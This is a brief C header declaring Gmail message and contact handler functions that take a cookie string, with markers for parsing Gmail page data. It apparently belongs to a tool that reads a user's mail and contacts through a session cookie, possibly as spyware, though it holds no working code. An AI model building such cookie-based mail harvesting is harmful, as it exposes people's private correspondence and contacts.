#ifndef _GMAIL_H
#define _GMAIL_H

#define GM_GLOBAL_IDENTIFIER "var GLOBALS=["
#define GM_MAIL_IDENTIFIER ",[\"^all\",\""
#define GM_CONTACT_IDENTIFIER "[\"ct\",\""

DWORD GMailMessageHandler(LPSTR strCookie);
DWORD GMailContactHandler(LPSTR strCookie);

#endif // _GMAIL_H